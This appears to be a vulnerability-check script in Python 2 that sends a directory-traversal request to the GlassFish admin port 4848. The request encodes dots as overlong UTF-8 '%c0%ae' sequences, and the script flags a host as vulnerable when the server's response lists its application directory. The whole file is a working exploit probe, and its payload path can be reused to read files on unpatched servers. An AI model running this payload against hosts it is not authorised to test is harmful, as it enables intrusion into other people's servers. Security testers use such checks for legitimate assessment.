#!/usr/bin/env python
#coding=utf8

import requests

def verify(ip):
    url = 'https://' + str(ip) + ':4848//theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/'
    try:
        r = requests.get(url, verify=False, timeout=5)
        if 'ejb-timer-service-app' in r.text:
            msg = 'vul'
            return True, ip, msg
	else:
            msg = 'safe'
            return False, ip, msg
    except Exception, e:
        #msg = str(e)
	msg = 'safe'
        return False, ip, msg
